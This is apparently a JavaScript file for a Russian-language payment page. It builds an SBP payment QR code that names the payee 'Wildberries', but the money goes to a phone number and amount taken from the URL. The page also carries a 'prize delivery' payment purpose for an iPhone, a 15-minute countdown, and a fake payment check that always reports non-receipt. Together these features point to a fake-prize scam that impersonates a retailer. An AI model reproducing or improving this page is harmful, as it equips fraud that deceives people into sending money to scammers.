// Получение данных из URL параметров
const urlParams = new URLSearchParams(window.location.search);
const name = urlParams.get('name') || 'Иванов Иван Иванович';
const phone = urlParams.get('phone') || '+7 (999) 123-45-67';
const amount = urlParams.get('amount') || '1500';

// Установка данных на странице
document.getElementById('recipientName').textContent = name;
document.getElementById('phoneDisplay').textContent = phone;
document.getElementById('phoneNumber').textContent = phone.replace(/\D/g, '');
document.getElementById('amountValue').textContent = parseInt(amount).toLocaleString('ru-RU');

// Генерация QR-кода для СБП
function generateQRCode() {
    const qrLoader = document.getElementById('qrLoader');
    const qrCode = document.getElementById('qrCode');
    
    // Формируем строку для СБП (формат: ST00012|Name=Wildberries|PersonalAcc=...|Sum=...)
    // В реальном проекте здесь будет реальный счет получателя
    const phoneDigits = phone.replace(/\D/g, '');
    const sbpString = `ST00012|Name=Wildberries|PersonalAcc=${phoneDigits}|Sum=${amount}00|Purpose=Оплата доставки iPhone 17 Pro Max`;
    
    // Генерируем QR-код
    QRCode.toCanvas(qrCode, sbpString, {
        width: 280,
        margin: 2,
        color: {
            dark: '#1a1a2e',
            light: '#ffffff'
        },
        errorCorrectionLevel: 'M'
    }, function (error) {
        if (error) {
            console.error('Ошибка генерации QR-кода:', error);
            qrLoader.innerHTML = '<p style="color: #f5576c;">Ошибка генерации QR-кода</p>';
            return;
        }
        
        // Скрываем загрузчик
        qrLoader.style.display = 'none';
        
        // Добавляем анимацию появления
        qrCode.style.opacity = '0';
        qrCode.style.transform = 'scale(0.9)';
        setTimeout(() => {
            qrCode.style.transition = 'all 0.5s cubic-bezier(0.16, 1, 0.3, 1)';
            qrCode.style.opacity = '1';
            qrCode.style.transform = 'scale(1)';
        }, 100);
    });
}

// Переключение между методами оплаты
const methodTabs = document.querySelectorAll('.method-tab');
const methodContents = document.querySelectorAll('.method-content');

methodTabs.forEach(tab => {
    tab.addEventListener('click', function() {
        const method = this.dataset.method;
        
        // Обновляем активную вкладку
        methodTabs.forEach(t => t.classList.remove('active'));
        this.classList.add('active');
        
        // Показываем соответствующий контент
        methodContents.forEach(content => {
            if (content.id === method + 'Method') {
                content.classList.remove('hidden');
            } else {
                content.classList.add('hidden');
            }
        });
    });
});

// Копирование номера телефона
const copyPhoneBtn = document.getElementById('copyPhoneBtn');
copyPhoneBtn.addEventListener('click', function() {
    const phoneNumber = phone.replace(/\D/g, '');
    navigator.clipboard.writeText(phoneNumber).then(() => {
        const originalText = this.querySelector('span').textContent;
        this.querySelector('span').textContent = 'Скопировано!';
        this.style.background = 'rgba(76, 175, 80, 0.1)';
        this.style.borderColor = '#4caf50';
        this.style.color = '#4caf50';
        
        setTimeout(() => {
            this.querySelector('span').textContent = originalText;
            this.style.background = '';
            this.style.borderColor = '';
            this.style.color = '';
        }, 2000);
    }).catch(err => {
        console.error('Ошибка копирования:', err);
        showNotification('Не удалось скопировать номер', 'error');
    });
});

// Таймер обратного отсчета
let timeLeft = 15 * 60; // 15 минут в секундах
const timerDisplay = document.getElementById('timerDisplay');

function updateTimer() {
    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;
    timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
    
    if (timeLeft <= 0) {
        timerDisplay.textContent = '00:00';
        showNotification('Время на оплату истекло', 'error');
        return;
    }
    
    timeLeft--;
    
    // Меняем цвет при малом времени
    if (timeLeft <= 60) {
        timerDisplay.style.color = '#f5576c';
        timerDisplay.style.animation = 'pulse 1s ease-in-out infinite';
    }
}

// Обновляем таймер каждую секунду
setInterval(updateTimer, 1000);
updateTimer();

// Проверка оплаты
const checkPaymentBtn = document.getElementById('checkPaymentBtn');
let checkAttempts = 0;

checkPaymentBtn.addEventListener('click', function() {
    checkAttempts++;
    const btnText = this.querySelector('span');
    const originalText = btnText.textContent;
    
    this.disabled = true;
    btnText.textContent = 'Проверка...';
    
    // Имитация проверки оплаты
    setTimeout(() => {
        // В реальном проекте здесь будет запрос к серверу для проверки статуса оплаты
        const isPaid = false; // Замените на реальную проверку
        
        if (isPaid) {
            showNotification('Оплата подтверждена! Ваш приз будет отправлен в ближайшее время.', 'success');
            // Перенаправление на страницу успеха
            // window.location.href = 'success.html';
        } else {
            if (checkAttempts >= 3) {
                showNotification('Оплата еще не поступила. Пожалуйста, проверьте правильность перевода или попробуйте позже.', 'error');
            } else {
                showNotification('Оплата еще не поступила. Попробуйте еще раз через несколько секунд.', 'error');
            }
        }
        
        btnText.textContent = originalText;
        this.disabled = false;
    }, 2000);
});

// Функция показа уведомлений
function showNotification(message, type = 'info') {
    const existing = document.querySelector('.notification');
    if (existing) {
        existing.remove();
    }
    
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.innerHTML = `
        <div class="notification-content">
            <span class="notification-icon">${type === 'success' ? '✓' : type === 'error' ? '✕' : 'ℹ'}</span>
            <span class="notification-message">${message}</span>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.style.opacity = '1';
        notification.style.transform = 'translateY(0)';
    }, 10);
    
    setTimeout(() => {
        notification.style.opacity = '0';
        notification.style.transform = 'translateY(-20px)';
        setTimeout(() => {
            notification.remove();
        }, 300);
    }, type === 'error' ? 5000 : 4000);
}

// Добавляем стили для уведомлений
const style = document.createElement('style');
style.textContent = `
    .notification {
        position: fixed;
        top: 20px;
        right: 20px;
        background: white;
        border-radius: 12px;
        padding: 16px 20px;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        z-index: 10000;
        opacity: 0;
        transform: translateY(-20px);
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        max-width: 400px;
        border-left: 4px solid;
    }
    
    .notification-success {
        border-left-color: #4ecdc4;
    }
    
    .notification-error {
        border-left-color: #f5576c;
    }
    
    .notification-info {
        border-left-color: #667eea;
    }
    
    .notification-content {
        display: flex;
        align-items: center;
        gap: 12px;
    }
    
    .notification-icon {
        font-size: 20px;
        font-weight: bold;
        width: 24px;
        height: 24px;
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 50%;
        flex-shrink: 0;
    }
    
    .notification-success .notification-icon {
        background: #4ecdc4;
        color: white;
    }
    
    .notification-error .notification-icon {
        background: #f5576c;
        color: white;
    }
    
    .notification-info .notification-icon {
        background: #667eea;
        color: white;
    }
    
    .notification-message {
        font-size: 14px;
        line-height: 1.5;
        color: #333;
    }
    
    @media (max-width: 480px) {
        .notification {
            right: 12px;
            left: 12px;
            max-width: none;
        }
    }
`;
document.head.appendChild(style);

// Генерируем QR-код при загрузке страницы
window.addEventListener('load', function() {
    setTimeout(generateQRCode, 500);
    
    // Анимация появления элементов
    const elements = document.querySelectorAll('.payment-content > *');
    elements.forEach((el, index) => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(20px)';
        setTimeout(() => {
            el.style.transition = 'all 0.6s cubic-bezier(0.16, 1, 0.3, 1)';
            el.style.opacity = '1';
            el.style.transform = 'translateY(0)';
        }, index * 100 + 200);
    });
});

